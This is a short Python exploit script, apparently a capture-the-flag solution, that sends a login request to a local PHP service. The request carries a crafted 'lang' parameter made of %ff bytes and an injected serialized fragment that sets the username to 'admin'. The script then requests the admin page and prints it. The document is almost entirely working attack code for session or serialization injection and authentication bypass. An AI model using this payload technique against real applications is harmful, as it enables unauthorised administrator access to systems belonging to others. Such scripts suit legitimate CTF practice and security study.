import requests

s = requests.Session()
r = s.post('http://localhost:1337/login?lang[%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff";s:1:"x";}s:8:"username";s:5:"admin";}x]=x', data= {
	'username': 'guest',
	'password': 'guest'
})
print(r.headers)
r = s.get('http://localhost:1337/admin?lang=en')
print(r.text)